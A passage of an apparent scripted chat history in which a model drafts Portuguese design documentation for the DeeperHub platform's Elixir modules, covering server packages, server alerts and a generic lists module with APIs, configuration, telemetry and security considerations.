*   `[:deeper_hub, :server_packages, :definition, :created | :updated | :deleted]`
    *   Metadados: `%{package_id: id, server_id: id, creator_id: id}`
*   `[:deeper_hub, :user_inventory, :package_instance, :created | :status_changed]` (Emitido pelo `UserInventoryService`)
    *   Metadados: `%{user_package_instance_id: id, user_id: id, server_package_id: id, new_status: atom}`

## ❌ 11. Tratamento de Erros

*   Falhas na aquisição (ex: pagamento falhou, saldo insuficiente) devem ser tratadas atomicamente – o pacote não é concedido.
*   Erros ao aplicar benefícios após uma aquisição bem-sucedida devem ser robustos (ex: enfileirar para retry, alertar admin).

## 🛡️ 12. Considerações de Segurança

*   **Validação de Preços e Moedas:** Garantir que os preços sejam manuseados corretamente e que as moedas sejam válidas.
*   **Dupla Concessão:** A lógica de aquisição deve impedir que um pacote de uso único seja concedido múltiplas vezes ou que uma assinatura seja estendida indevidamente sem pagamento.
*   **Autorização:** Apenas proprietários de servidores podem criar/gerenciar pacotes para *seus* servidores.
*   **Payload de Benefícios:** Se o `items_or_benefits_payload` for muito flexível, validar seu conteúdo para evitar abusos ou injeção de dados maliciosos que possam ser interpretados por outros sistemas.

## 🧑‍💻 13. Contribuição

*   Ao adicionar novos tipos de pacotes ou benefícios, pense em como a concessão e o rastreamento serão feitos no `UserInventoryService` (ou similar).
*   A clareza na UI sobre o que cada pacote oferece é fundamental.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de \"carrinho de compras\" para adquirir múltiplos pacotes de uma vez.
*   [ ] Suporte para pacotes presenteáveis (gifting).
*   [ ] Integração com um sistema de cupons de desconto para pacotes.
*   [ ] Permitir pacotes com quantidade limitada (ex: \"Apenas 100 disponíveis\").
*   [ ] Histórico de preços para pacotes.
*   [ ] Lógica para lidar com reembolsos ou chargebacks de pacotes pagos.
*   [ ] \"Pacotes dinâmicos\" cujo conteúdo ou preço podem variar com base em certos critérios ou eventos.

---

*Última atualização: 2025-05-12*

---

Este módulo adiciona uma dimensão de monetização/engajamento importante!

Para o próximo, podemos fazer `DeeperHub.ServerAlerts` ou `DeeperHub.ServerUpdateMessages`, ou se preferir, o módulo mais genérico `DeeperHub.Lists`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com os módulos relacionados a `Servers` e detalhar o `DeeperHub.ServerAlerts`. Este módulo é para comunicação mais direta e potencialmente urgente com os jogadores de um servidor.

---

# Módulo: `DeeperHub.ServerAlerts` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.ServerAlerts`

O módulo `DeeperHub.ServerAlerts` é responsável por gerenciar e entregar **alertas e anúncios importantes** dos proprietários de servidores para os jogadores ou para a comunidade de um servidor específico na plataforma DeeperHub. Diferentemente de mensagens de atualização mais longas (como patch notes, gerenciadas por `ServerUpdateMessages`), os alertas são tipicamente mensagens mais curtas, diretas e que podem ter um caráter de urgência ou aviso.

Exemplos incluem:
*   Anúncio de reinício iminente do servidor.
*   Aviso sobre problemas técnicos temporários.
*   Notificação de um evento especial começando agora.
*   Mensagens de boas-vindas para novos jogadores no servidor (se não automatizadas de outra forma).

Este módulo lida com a criação, visualização e, potencialmente, a forma como esses alertas são exibidos ou entregues aos usuários relevantes. 😊

*(Nota: Na documentação original, este era `DeeperHub.Services.ServerAlerts`. Será tratado como `DeeperHub.ServerAlerts`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Criação de Alertas (`create_alert/1`):**
    *   Permitir que proprietários de servidores (ou administradores com permissão) criem novos alertas para seus servidores.
    *   Cada alerta inclui: mensagem, tipo/severidade (ex: `:info`, `:warning`, `:critical`), servidor associado, data de início e fim de validade/exibição (opcional).
*   **Gerenciamento de Alertas (`update_alert/2`, `delete_alert/1`):**
    *   Permitir a edição (se o alerta ainda não foi amplamente disseminado) ou exclusão de alertas.
    *   Marcar alertas como ativos ou inativos.
*   **Listagem de Alertas:**
    *   Listar alertas ativos para um servidor específico (`list_active_alerts_by_server/2`).
    *   Listar todos os alertas (histórico) para um servidor (`list_alerts_by_server/2`).
    *   (Opcional) Listar alertas globais da plataforma, se essa funcionalidade também residir aqui.
*   **Exibição/Entrega de Alertas:**
    *   Fornecer dados para que a UI exiba alertas relevantes (ex: um banner no topo da página do servidor, uma notificação in-app específica para quem está online naquele servidor).
    *   (Opcional) Integrar com `DeeperHub.Notifications` para enviar alertas como notificações push ou email para usuários inscritos em alertas de um servidor (se o usuário \"seguir\" o servidor ou optar por isso).
*   **Tipos de Alertas:**
    *   Suportar diferentes tipos de alertas que podem ter apresentações ou comportamentos distintos (ex: um alerta de \"manutenção\" pode ter um contador regressivo).
*   **Programação de Alertas (Opcional):**
    *   Permitir que alertas sejam agendados para aparecer em um horário específico.
*   **Observabilidade e Auditoria:**
    *   Logar a criação e modificação de alertas.
    *   Publicar eventos de domínio (ex: `server_alert.published`) no `Core.EventBus`.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerAlerts` (Fachada Pública):**
    *   Ponto de entrada para operações de alertas de servidor.
    *   Delega para o `ServerAlertsService`.
2.  **`DeeperHub.ServerAlerts.Services.ServerAlertsService` (ou `DefaultServerAlertsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `AlertSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id`.
        *   `DeeperHub.Accounts`: Para `user_id` do criador.
        *   `DeeperHub.Auth`/`RBAC`: Para permissões.
        *   `DeeperHub.Core.EventBus`.
        *   `DeeperHub.Core.Cache`: Para cachear alertas ativos.
        *   `DeeperHub.Notifications` (se alertas são enviados como notificações push/email).
3.  **`DeeperHub.ServerAlerts.Schemas.AlertSchema` (ex-`Alert`):**
    *   Campos: `id`, `server_id`, `created_by_user_id`, `message` (string/text), `alert_type` (atom, ex: `:info`, `:warning`, `:maintenance`, `:event_starting`), `severity` (atom, ex: `:low`, `:medium`, `:high`), `start_time` (DateTime UTC, para exibição agendada), `end_time` (DateTime UTC, para expiração automática), `is_active` (boolean), `target_audience` (atom, ex: `:all_server_players`, `:specific_roles_on_server` - opcional), `inserted_at`, `updated_at`.
4.  **`DeeperHub.ServerAlerts.Storage` (ou lógica no `ServerAlertsService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.ServerAlerts.CachedAdapter` (Opcional):**
    *   Camada de cache explícita.
6.  **Workers (Opcional):**
    *   `AlertStatusUpdateWorker`: Para ativar/desativar alertas com base em `start_time` e `end_time`.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/server_alerts/
├── server_alerts.ex                  # Fachada Pública
│
├── services/
│   └── server_alerts_service.ex      # Serviço principal
│
├── schemas/
│   └── alert_schema.ex
│
├── storage.ex                        # (Opcional)
├── cached_adapter.ex                 # (Opcional)
│
├── workers/                          # Opcional
│   └── alert_status_update_worker.ex
│
├── supervisor.ex                     # (Se houver GenServers)
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Diferenciação de `ServerUpdateMessages`:** Alertas são geralmente mais curtos, mais imediatos e podem ter um \"tempo de vida\" mais curto. `UpdateMessages` são mais para notas de patch e anúncios mais permanentes.
*   **Mecanismo de Exibição:** Como os alertas são mostrados aos usuários é uma decisão de UI/UX, mas este módulo precisa fornecer os dados de forma que possam ser facilmente consumidos (ex: \"mostrar os 3 alertas ativos mais recentes para este servidor\").
*   **Targeting de Audiência:** Inicialmente simples (todos os visitantes da página do servidor), mas pode evoluir para targeting mais específico.

## 🛠️ 4. Casos de Uso Principais

*   **Proprietário Anuncia Reinício Iminente do Servidor:**
    *   Cria um alerta: \"Servidor reiniciando em 15 minutos para atualização rápida!\" com tipo `:maintenance` e severidade `:high`.
    *   API chama `ServerAlerts.create_alert(user_id, server_id, attrs)`.
    *   O alerta aparece em destaque na página do servidor.
*   **Proprietário Avisa sobre Lag Temporário:**
    *   Cria um alerta: \"Estamos experienciando lag temporário devido a um problema com o provedor. Estamos trabalhando nisso.\" tipo `:warning`, severidade `:medium`.
*   **Jogador Visita a Página de um Servidor:**
    *   A UI chama uma API que internamente usa `ServerAlerts.list_active_alerts_by_server(server_id, %{limit: 3})` para buscar alertas a serem exibidos.

## 🌊 5. Fluxos Importantes

### Fluxo de Criação e Exibição de Alerta

1.  **Proprietário (UI):** Submete formulário de novo alerta.
2.  **Controller API:** Valida auth. Chama `DeeperHub.ServerAlerts.create_alert(current_user.id, server_id, params[\"alert_attrs\"])`.
3.  **`ServerAlertsService.create_alert/3`:**
    *   Valida permissão.
    *   Valida e sanitiza a mensagem.
    *   Cria um `AlertSchema` changeset (com `is_active: true`, `start_time` pode ser `now` ou futuro).
    *   `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Publica evento `server_alert.created` no `Core.EventBus`.
        *   Invalida cache de alertas ativos para o servidor.
        *   (Opcional) Se `start_time` for imediato e houver integração com notificações push/in-app para \"seguidores\", enfileira essas notificações.
        *   Retorna `{:ok, alert_struct}`.
4.  **Outro Usuário (UI):** Visita a página do servidor.
5.  **Controller API da Página do Servidor:** Chama `DeeperHub.ServerAlerts.list_active_alerts_by_server(server_id, %{limit: 3})`.
6.  **`ServerAlertsService.list_active_alerts_by_server/2`:**
    *   Verifica o cache.
    *   Se miss, constrói query Ecto para buscar `AlertSchema`s onde `server_id` corresponde, `is_active == true`, e `(start_time == nil OR start_time <= now()) AND (end_time == nil OR end_time >= now())`.
    *   Ordena por `inserted_at` descendente ou prioridade.
    *   Coloca no cache.
    *   Retorna a lista de alertas.
7.  **UI:** Exibe os alertas.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.ServerAlerts`)

*(Baseado na documentação original para `Alert` e expandindo)*

### 6.1. Gerenciamento de Alertas (Proprietário/Admin)

*   **`DeeperHub.ServerAlerts.create_alert(creator_user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, Alert.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{message: String.t(), alert_type: atom(), severity: atom() | nil, start_time: DateTime.t() | nil, end_time: DateTime.t() | nil}`.
*   **`DeeperHub.ServerAlerts.update_alert(alert_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Alert.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerAlerts.delete_alert(alert_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
*   **`DeeperHub.ServerAlerts.activate_alert(alert_id :: String.t(), current_user_id :: String.t()) :: {:ok, Alert.t()}`** (Muda `is_active` para true)
*   **`DeeperHub.ServerAlerts.deactivate_alert(alert_id :: String.t(), current_user_id :: String.t()) :: {:ok, Alert.t()}`** (Muda `is_active` para false)

### 6.2. Consulta de Alertas

*   **`DeeperHub.ServerAlerts.get_alert(alert_id :: String.t()) :: {:ok, Alert.t() | nil}`**
*   **`DeeperHub.ServerAlerts.list_alerts_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Alert.t()), Pagination.t()}`**
    *   `opts`: `:is_active` (boolean), `:alert_type`, `:severity`, `:page`, `:per_page`, `:sort_by`.
*   **`DeeperHub.ServerAlerts.list_active_alerts_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Alert.t())}`** (Atalho para `list_alerts_by_server` com filtros de atividade e data).
    *   `opts`: `:limit`.
*   **`DeeperHub.ServerAlerts.broadcast_alert/3` (da doc original, mas parece mais uma ação de alto nível que *usa* `create_alert` internamente para múltiplos usuários se o targeting for para usuários específicos, ou apenas cria um alerta de servidor se for para todos do servidor):**
    *   Se a intenção é notificar múltiplos usuários via `DeeperHub.Notifications` e também criar um `AlertSchema` visível na página do servidor, este nome faz sentido.
    *   `broadcast_alert(server_id, message, user_ids_or_target_group)`

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_alerts, :enabled]`** (Boolean).
*   **`[:server_alerts, :max_message_length]`** (Integer). (Padrão: `500`)
*   **`[:server_alerts, :default_alert_duration_minutes]`** (Integer | nil): Se `end_time` não for fornecido, quanto tempo o alerta fica ativo. `nil` para indefinido. (Padrão: `60`)
*   **`[:server_alerts, :max_active_alerts_per_server_displayed]`** (Integer): Quantos alertas ativos mostrar na UI de uma vez. (Padrão: `3`)
*   **`[:server_alerts, :allowed_alert_types]`** (List de Atoms).
*   **`[:server_alerts, :cache, :active_alerts_ttl_seconds]`** (Integer).
*   **`[:server_alerts, :worker, :status_update_interval_minutes]`** (Integer).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `created_by_user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permissões.
*   `DeeperHub.Notifications` (Opcional): Se alertas também disparam notificações formais.
*   `DeeperHub.Security.XssProtection` / `Shared.ContentValidation`: Para sanitizar mensagens.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## 🤝 9. Como Usar / Integração

*   **UI do Proprietário do Servidor:** Formulários para criar/gerenciar alertas.
*   **Página do Servidor (UI do Jogador):** Seção para exibir alertas ativos (`list_active_alerts_by_server`).
*   **`AlertStatusUpdateWorker`:** Para gerenciar o ciclo de vida de alertas agendados/expirados.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `AlertSchema`.
*   Testar a lógica de `is_active` com `start_time` e `end_time`.
*   Testar a listagem de alertas ativos vs. todos os alertas.
*   Testar a sanitização da mensagem do alerta.
*   Localização: `test/deeper_hub/server_alerts/`.

### 10.2. Métricas

*   `deeper_hub.server_alerts.created.count` (tags: `server_id`, `alert_type`, `severity`)
*   `deeper_hub.server_alerts.displayed.count` (tags: `server_id`, `alert_id`) (Se o rastreamento de visualização for implementado).
*   `deeper_hub.server_alerts.active.gauge` (Gauge, tags: `server_id`)

### 10.3. Logs

*   **Nível INFO:** Novo alerta criado/publicado. Alerta expirado/desativado.
*   **Nível WARNING:** Tentativa não autorizada de gerenciar um alerta.

### 10.4. Telemetria

*   `[:deeper_hub, :server_alerts, :alert, :created | :updated | :deleted | :status_changed]`
    *   Metadados: `%{alert_id: id, server_id: id, author_id: id, new_status: atom_if_changed}`

## ❌ 11. Tratamento de Erros

*   Falhas de validação ao criar/atualizar retornam `{:error, changeset}`.
*   Operações não autorizadas retornam `{:error, :unauthorized}`.

## 🛡️ 12. Considerações de Segurança

*   **Sanitização de Conteúdo:** A mensagem do alerta deve ser sanitizada para prevenir XSS, pois é exibida na UI.
*   **Autorização:** Apenas proprietários de servidores ou administradores devem poder criar/gerenciar alertas para um servidor.
*   **Abuso:** Limitar a frequência com que alertas podem ser postados ou o número de alertas ativos para evitar spam visual.

## 🧑‍💻 13. Contribuição

*   Novos tipos de alerta ou severidades devem ser adicionados à configuração.
*   Considere como os alertas serão renderizados na UI ao definir o comprimento e o tipo de conteúdo.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Permitir \"fixar\" um alerta importante para que ele permaneça visível por mais tempo ou no topo.
*   [ ] Suporte para alertas com ações (ex: um botão \"Junte-se ao Evento Agora!\" em um alerta de início de evento).
*   [ ] Permitir que usuários individuais \"dispensem\" alertas que já viram.
*   [ ] Histórico de alertas para administradores com mais detalhes de quem criou/modificou.
*   [ ] Internacionalização das mensagens de alerta se o conteúdo for padronizado para certos tipos.

---

*Última atualização: 2025-05-12*

---

Este cobre os Alertas de Servidor! Eles são uma forma útil de comunicação rápida.

Para o próximo, podemos fazer o `DeeperHub.ServerUpdateMessages` (que é para comunicação mais longa, como patch notes), ou `DeeperHub.Lists` (o módulo genérico de listas da documentação original), ou algum outro?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Já detalhamos o `DeeperHub.ServerUpdateMessages`.

Vamos agora para o `DeeperHub.Lists`. Este módulo, conforme a documentação original, parece ser um local para armazenar listas de dados genéricos como tipos de conquistas, categorias, tipos de conteúdo, engines de jogos, etc. Essencialmente, dados de enumeração ou \"lookup tables\".

---

# Módulo: `DeeperHub.Lists` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Lists`

O módulo `DeeperHub.Lists` (originalmente `DeeperHub.Services.Lists`) serve como um **repositório centralizado para listas de dados de referência e enumerações** usadas em todo o sistema DeeperHub. Em vez de hardcodar essas listas em vários módulos ou ter múltiplas tabelas pequenas e isoladas, este módulo fornece uma maneira genérica de armazenar, gerenciar e consultar esses \"tipos\" ou \"categorias\".

Exemplos de listas que podem ser gerenciadas aqui:
*   Tipos de Conquistas (ex: 'Milestone', 'Event')
*   Categorias Gerais (ex: 'Gaming', 'Programming')
*   Tipos de Conteúdo (ex: 'Article', 'Video')
*   Engines de Jogos (ex: 'Unity', 'Unreal Engine')
*   Tipos de Feedback (ex: 'Bug Report', 'Feature Request')
*   Idiomas Suportados
*   Tipos de Rede de Servidor
*   Plataformas Suportadas
*   Status Comuns (ex: para tickets, servidores, etc., se não forem específicos demais para seus próprios módulos)
*   Tags Globais (se houver um sistema de tags que não seja específico apenas para servidores)

O objetivo é fornecer consistência, facilitar a adição de novas opções e permitir que a UI popule seletores e filtros de forma dinâmica. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Itens de Lista Genéricos (`create_list_item/2`, `get_list_item/2`, `update_list_item/2`, `delete_list_item/1`):**
    *   Permitir que administradores criem novos itens para uma lista específica (ex: adicionar um novo \"Tipo de Conquista\").
    *   Cada item de lista teria um `list_type` (identificador da lista, ex: `:achievement_type`), um `value` (o valor real, ex: \"milestone\"), uma `label` (para exibição, ex: \"Marco Histórico\"), e opcionalmente `description`, `is_active`, `metadata` (JSONB para dados extras).
    *   Atualizar ou desativar/excluir itens de lista.
*   **Consulta de Itens de Lista:**
    *   Listar todos os itens para um `list_type` específico (`list_items_by_type/1`).
    *   Obter um item específico pelo seu valor ou ID dentro de um `list_type`.
    *   Filtrar itens por `is_active`.
*   **Validação de Dados:**
    *   Garantir que os valores e labels sejam únicos dentro de um `list_type`.
    *   Validar os campos ao criar/atualizar itens.
*   **Caching:**
    *   Cachear listas frequentemente acessadas para performance, já que esses dados de referência raramente mudam.
*   **Internacionalização de Labels (Opcional):**
    *   Se as `labels` precisarem ser traduzidas, este módulo pode integrar com `Core.Internationalization` ou armazenar traduções no campo `metadata`.
*   **Observabilidade e Auditoria:**
    *   Logar e auditar a criação/modificação de itens de lista, especialmente aqueles que afetam a lógica do sistema.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Lists` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a listas genéricas.
    *   Delega para o `ListsService`.
2.  **`DeeperHub.Lists.Services.ListsService` (ou `DefaultListsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio para o gerenciamento de itens de lista.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `ListItemSchema`.
        *   `DeeperHub.Core.Cache`: Para cachear listas.
        *   `DeeperHub.Core.ConfigManager`: Para obter a lista de `list_type`s conhecidos ou configurações padrão.
        *   `DeeperHub.Audit`: Para auditar modificações.
3.  **`DeeperHub.Lists.Schemas.ListItemSchema` (Nova Sugestão, em vez de múltiplos schemas pequenos):**
    *   Um schema Ecto genérico para armazenar todos os itens de lista.
    *   Campos: `id`, `list_type` (string ou atom, indexado), `value` (string, indexado dentro do `list_type`), `label` (string), `description` (text, opcional), `metadata` (jsonb, opcional), `is_active` (boolean, default: true), `sort_order` (integer, opcional), `inserted_at`, `updated_at`.
    *   Índice único em `(list_type, value)`.
4.  **`DeeperHub.Lists.Storage` (ou lógica no `ListsService`):**
    *   Encapsula as queries Ecto para `ListItemSchema`.
5.  **`DeeperHub.Lists.CachedAdapter` (Opcional, da documentação original para outros serviços, mas aplicável aqui):**
    *   Camada de cache explícita se o `Core.Cache` genérico não for suficiente.

*(Os múltiplos schemas pequenos listados na documentação original como `AchievementType`, `Category`, `ContentType`, etc., seriam consolidados no `ListItemSchema` usando o campo `list_type` para diferenciá-los. Isso simplifica muito a manutenção e a adição de novas listas sem alterações de schema no DB.)*

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/lists/
├── lists.ex                          # Fachada Pública
│
├── services/
│   └── lists_service.ex              # Serviço principal
│
├── schemas/
│   └── list_item_schema.ex
│
├── storage.ex                        # (Opcional) Módulo de queries Ecto
├── cached_adapter.ex                 # (Opcional)
├── supervisor.ex                     # (Se houver GenServers, ex: para cache warming)
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Schema Genérico Único:** Usar um `ListItemSchema` com um campo `list_type` é mais escalável e flexível do que criar uma nova tabela para cada pequena lista de enumeração.
*   **`value` vs. `label`:** O `value` é o identificador programático (ex: `:bug_report`, `\"milestone_ach\") e a `label` é para exibição na UI (ex: \"Relatório de Bug\", \"Conquista de Marco\").
*   **Dados Estáticos vs. Gerenciados por Admin:** Decidir se essas listas são populadas via seeds no deploy (mais estático) ou gerenciadas dinamicamente por administradores através de uma UI. A abordagem com `ListItemSchema` facilita o gerenciamento dinâmico.
*   **Caching Agressivo:** Como esses dados de referência mudam raramente, eles são candidatos ideais para caching agressivo.

## 🛠️ 4. Casos de Uso Principais

*   **Popular um Dropdown na UI para Seleção de Categoria de Suporte:**
    *   Frontend/API chama `DeeperHub.Lists.list_items_by_type(:support_ticket_category, %{is_active: true, sort_by: :label_asc})`.
    *   A lista de `%{value: \"technical_issue\", label: \"Problema Técnico\"}, ...` é usada para renderizar o dropdown.
*   **Administrador Adiciona um Novo \"Tipo de Recompensa\":**
    *   Admin usa uma interface de gerenciamento.
    *   API chama `DeeperHub.Lists.create_list_item(%{list_type: :reward_type, value: \"exclusive_skin\", label: \"Skin Exclusiva\", description: \"Desbloqueia uma skin rara para o avatar.\"}, admin_user_id)`.
*   **Sistema Valida um `event_type` Fornecido pelo Usuário:**
    *   Ao criar um `ServerEvent`, o `ServerEventsService` verifica se o `event_type` fornecido é um valor válido.
    *   Chama `DeeperHub.Lists.get_list_item_by_value(:server_event_type, user_provided_event_type)`. Se retornar `nil` ou inativo, o tipo é inválido.

## 🌊 5. Fluxos Importantes

### Fluxo de Adição de um Novo Item de Lista por um Administrador

1.  **Administrador (UI):** Seleciona a lista (ex: \"Tipos de Feedback\"), preenche `value` (\"interface_bug\") e `label` (\"Bug de Interface\").
2.  **Controller API (Admin):** Valida permissões. Chama `DeeperHub.Lists.create_list_item(admin_user_id, %{list_type: :feedback_type, value: \"interface_bug\", label: \"Bug de Interface\"})`.
3.  **`ListsService.create_list_item/2`:**
    *   Valida os atributos (ex: `list_type` é conhecido, `value` é único para esse `list_type`).
    *   Cria um `ListItemSchema` changeset.
    *   Se válido, `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Publica evento `list_item.created` no `Core.EventBus`.
        *   Invalida o cache para `:feedback_type`.
        *   Audita a ação.
        *   Retorna `{:ok, list_item_struct}`.
    *   Se falha, retorna erro.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Lists`)

### 6.1. Gerenciamento de Itens (Principalmente Admin)

*   **`DeeperHub.Lists.create_list_item(admin_user_id :: String.t(), attrs :: map()) :: {:ok, ListItem.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{list_type: atom() | String.t(), value: String.t(), label: String.t(), description: String.t() | nil, metadata: map() | nil, is_active: boolean() | true, sort_order: integer() | nil}`.
*   **`DeeperHub.Lists.update_list_item(admin_user_id :: String.t(), list_item_id :: String.t(), attrs :: map()) :: {:ok, ListItem.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.Lists.delete_list_item(admin_user_id :: String.t(), list_item_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found | :in_use}`**
    *   Pode impedir a exclusão se o item estiver em uso por outras entidades, preferindo desativar (`is_active: false`).

### 6.2. Consulta de Itens (Público/Sistema)

*   **`DeeperHub.Lists.list_items_by_type(list_type :: atom() | String.t(), opts :: keyword()) :: {:ok, list(ListItem.t())}`**
    *   `opts`: `:is_active` (boolean, Padrão: `true`), `:sort_by` (`:label`, `:value`, `:sort_order`), `:sort_order_direction` (`:asc`, `:desc`).
*   **`DeeperHub.Lists.get_list_item_by_value(list_type :: atom() | String.t(), item_value :: String.t(), opts :: keyword()) :: {:ok, ListItem.t() | nil}`**
    *   `opts`: `:is_active` (boolean, Padrão: `true`).
*   **`DeeperHub.Lists.get_list_item_label(list_type :: atom() | String.t(), item_value :: String.t(), default_label :: String.t() | nil) :: String.t() | nil` (Nova Sugestão)**
    *   Função de conveniência para obter rapidamente a `label` de um `value`.
*   **`DeeperHub.Lists.get_all_list_types() :: {:ok, list(atom() | String.t())}` (Nova Sugestão)**
    *   Retorna todos os `list_type`s distintos definidos no sistema.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:lists, :predefined_list_types]`** (List de Atoms/Strings): Uma lista de todos os `list_type`s que são conhecidos pelo sistema. Pode ser usado para validação ou para popular UIs de administração.
    *   Ex: `[:achievement_type, :category, :content_type, :engine, :feedback_type, :language, :network_type, :platform, :server_status, :tag_category, :support_ticket_priority]`
*   **`[:lists, :cache, :list_items_ttl_seconds]`** (Integer): TTL para cache de listas de itens. (Padrão: `3600` ou mais, pois mudam raramente).
*   **`[:lists, :allow_dynamic_list_types]`** (Boolean): Se `false`, apenas `list_type`s definidos em `predefined_list_types` podem ser criados. (Padrão: `false` para maior controle).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.Repo`, `Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Cache`.
*   `DeeperHub.Auth`/`RBAC`: Para permissões de administração das listas.
*   `DeeperHub.Audit`: Para auditar modificações.
*   `DeeperHub.Core.Internationalization` (Opcional): Se as `labels` forem traduzidas.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## 🤝 9. Como Usar / Integração

*   **Validação de Entrada:** Módulos de serviço usam `get_list_item_by_value/3` para validar se um valor fornecido pelo usuário para um campo de \"tipo\" é uma opção válida e ativa.
    ```elixir
    # Em DeeperHub.Support.Services.SupportService
    def create_ticket(attrs) do
      case DeeperHub.Lists.get_list_item_by_value(:support_ticket_priority, attrs[:priority_value]) do
        {:ok, nil} -> {:error, %{priority: \"Prioridade inválida\"}}
        {:ok, _priority_item} -> # Prossiga com a criação
        # ...
      end
    end
    ```
*   **Popular Dropdowns em UIs:** A UI busca os itens de uma lista via API para preencher campos `<select>`.
*   **Seed de Dados:** O arquivo `priv/repo/seeds.exs` pode usar `DeeperHub.Lists.create_list_item/2` para popular as listas iniciais durante o setup do banco de dados.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `ListItemSchema`.
*   Testar a unicidade de `value` dentro de um `list_type`.
*   Testar as funções de listagem com filtros (`:is_active`).
*   Testar a lógica de cache.
*   Localização: `test/deeper_hub/lists/`.

### 10.2. Métricas

*   `deeper_hub.lists.items.created.count` (tags: `list_type`)
*   `deeper_hub.lists.items.updated.count` (tags: `list_type`)
*   `deeper_hub.lists.cache.hit.count` (tags: `list_type`)
*   `deeper_hub.lists.cache.miss.count` (tags: `list_type`)

### 10.3. Logs

*   **Nível INFO:** Novo item de lista criado/atualizado/desativado. Cache de lista invalidado.
*   **Nível WARNING:** Tentativa de criar item para um `list_type` não permitido (se `allow_dynamic_list_types` for `false`).
*   **Nível ERROR:** Falha ao persistir item de lista.

### 10.4. Telemetria

*   `[:deeper_hub, :lists, :item, :created | :updated | :deleted]`
    *   Metadados: `%{list_item_id: id, list_type: type, value: val, admin_id: id}`
*   `[:deeper_hub, :lists, :query, :by_type]`
    *   Metadados: `%{list_type: type, from_cache: boolean, result_count: count}`

## ❌ 11. Tratamento de Erros

*   Falhas de validação ao criar/atualizar retornam `{:error, changeset}`.
*   Tentativa de obter um item inexistente retorna `nil` ou `{:ok, nil}`.
*   Operações de escrita por usuários não autorizados são bloqueadas por `RBAC` antes de atingir o serviço.

## 🛡️ 12. Considerações de Segurança

*   **Autorização:** A modificação de itens de lista deve ser restrita a administradores.
*   **Validação de `list_type`:** Se `allow_dynamic_list_types` for `true`, deve haver alguma validação no formato do `list_type` para evitar a criação de um número excessivo ou malformado de tipos de lista.
*   **Impacto das Mudanças:** Alterar ou desativar um `value` de um `list_type` que é usado como enum em código ou no banco de dados pode ter consequências. Planejar essas mudanças com cuidado (ex: migrações de dados, preferir desativar a excluir).

## 🧑‍💻 13. Contribuição

*   Ao adicionar uma nova lista de dados de referência, defina um novo `list_type` (e adicione-o a `[:lists, :predefined_list_types]` se necessário) e popule-o via seeds ou UI de admin.
*   Considere se a `label` precisa de internacionalização.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa para gerenciar todos os `list_type`s e seus itens.
*   [ ] Adicionar suporte explícito para internacionalização das `labels` dos `ListItemSchema` (ex: um campo `translations` JSONB ou uma tabela separada).
*   [ ] Permitir a definição de hierarquias simples entre itens de uma lista (ex: categorias e subcategorias) usando um campo `parent_list_item_id`.
*   [ ] Adicionar a capacidade de \"fixar\" certos valores para que sempre apareçam no topo das listas, independentemente da ordenação.
*   [ ] Worker para verificar a consistência: garantir que todos os `list_type`s referenciados em outras partes do sistema (ex: em `enum` fields de outros schemas) existam como `ListItemSchema`s.

---

*Última atualização: 2025-05-12*

---

Este módulo `Lists` pode simplificar bastante o gerenciamento de dados de enumeração!

